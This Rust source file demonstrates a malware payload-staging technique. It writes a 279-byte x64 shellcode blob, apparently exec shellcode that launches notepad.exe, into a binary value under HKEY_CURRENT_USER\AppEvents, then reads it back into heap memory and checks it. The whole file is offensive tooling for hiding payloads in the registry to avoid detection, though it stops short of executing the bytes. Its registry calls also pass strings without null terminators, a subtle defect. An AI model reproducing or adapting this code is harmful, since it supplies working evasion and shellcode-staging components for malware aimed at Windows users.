extern crate winapi;

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::ctypes::c_void;
use winapi::shared::minwindef::HKEY;
use winapi::um::winreg::{HKEY_CURRENT_USER, LSTATUS, RegCloseKey, RegCreateKeyExA, RegGetValueA, RegOpenKeyExA, RegSetValueExA, RRF_RT_ANY};
use winapi::um::heapapi::{GetProcessHeap, HeapAlloc};
use winapi::um::winnt::{HEAP_ZERO_MEMORY, KEY_SET_VALUE, KEY_WRITE, REG_BINARY, REG_OPTION_NON_VOLATILE};

const REGISTRY : &str = "AppEvents";
const REGSTRING : &str = "Testing the program";

fn to_wide(string: &str) -> Vec<u16> {
    OsStr::new(string).encode_wide().chain(std::iter::once(0)).collect()
}

fn write_shellcode_to_registry(p_shellcode: &[u8]) -> bool {

    let shellcode_size = p_shellcode.len();
    let mut h_key: HKEY = std::ptr::null_mut();

    let create_status = unsafe {
        RegCreateKeyExA(
            HKEY_CURRENT_USER,
            REGISTRY.as_ptr() as *const i8,
            0,
            std::ptr::null_mut(),
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            std::ptr::null_mut(),
            &mut h_key,
            std::ptr::null_mut(),
        )
    };

    if create_status != 0 {
        println!("[!] RegCreateKeyExA failed with error {}", std::io::Error::last_os_error());
        return false;
    }

    let status = unsafe {
        RegOpenKeyExA(
            HKEY_CURRENT_USER,
            REGISTRY.as_ptr() as *const i8,
            0,
            KEY_SET_VALUE,
            &mut h_key,
        )
    };

    if status != 0 {
        println!("[!] RegOpenKeyExA failed with error {}", std::io::Error::last_os_error());
        return false;
    }

    let status = unsafe {
        RegSetValueExA(
            h_key,
            REGSTRING.as_ptr() as *const i8,
            0,
            REG_BINARY,
            p_shellcode.as_ptr(),
            shellcode_size as u32,
        )
    };

    if status != 0 {
        println!("[!] RegSetValueExA failed with error {}", std::io::Error::last_os_error());
        unsafe { RegCloseKey(h_key) };
        return false;
    }

    unsafe { RegCloseKey(h_key) };

    true
}

fn read_shellcode_from_registry(p_size: usize, p_payload: &mut *mut u8) -> bool {
    let mut bytes_read : u32 = p_size as u32;
    let mut p_bytes : *mut c_void = unsafe { std::mem::zeroed() };

    p_bytes = unsafe { HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, p_size) };

    let mut status = unsafe { RegGetValueA(HKEY_CURRENT_USER, REGISTRY.as_ptr() as *const i8, REGSTRING.as_ptr() as *const i8, RRF_RT_ANY, std::ptr::null_mut(), p_bytes, &mut bytes_read) };

    if status != 0 {
        println!("[!] RegGetValueA failed with error {}", std::io::Error::last_os_error());
        return false;
    }

    if bytes_read != p_size as u32 {
        println!("Total bytes read: {}, instead of reading {} bytes", bytes_read, p_size);
        return false;
    }

    unsafe {
        *p_payload = p_bytes as *mut u8;
    };

    true
}

fn main() {
    let shellcode : [u8; 279] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
        0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
        0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
        0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
        0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
        0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
        0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
        0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
        0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
        0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
        0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
        0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
        0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
        0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
        0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
        0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
        0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
        0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
        0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,
        0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
        0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
        0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,0x65,
        0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00];


    match write_shellcode_to_registry(&shellcode) {
        true => (),
        false => panic!(),
    };

    let mut p_payload: *mut u8 = std::ptr::null_mut();
    let p_size : usize = 279;

    read_shellcode_from_registry(p_size, &mut p_payload);

    let shellcode_from_registry = unsafe { std::slice::from_raw_parts(p_payload, p_size) };
    println!("{:?}", shellcode == shellcode_from_registry);
}
